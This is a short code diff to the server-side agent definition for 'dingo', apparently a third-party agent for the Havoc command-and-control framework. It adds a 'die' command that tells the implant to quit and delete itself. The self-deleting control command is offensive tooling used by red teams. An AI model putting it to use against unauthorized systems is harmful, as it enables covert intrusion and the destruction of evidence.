@@ -1,6 +1,9 @@
 from havoc.service import HavocService
 from havoc.agent import *
 
+# ==============
+# == Commands ==
+# ==============
 class CommandExit(Command):
     Name = "exit"
     Description = "tells agent to exit"
@@ -15,7 +18,23 @@ class CommandExit(Command):
         packer.add_data(data)
         return packer.buffer
 
-# Agent Class
+class CommandDie(Command):
+    Name = "die"
+    Description = "tell agent to quit and delete itself"
+    Help = "tell agent to quit and delete itself"
+    NeedAdmin = False
+    Mitr = []
+    Params = []
+    
+    def job_generate(self, arguments: dict) -> bytes:
+        packer = Packer()
+        data = {"TaskCommand":"die", "TaskFile":"", "TaskArgument":""}
+        packer.add_data(data)
+        return packer.buffer
+
+# =================
+# == Agent Class ==
+# =================
 class dingo(AgentType):
     Name = "dingo"
     Author = "Deranged0tter"
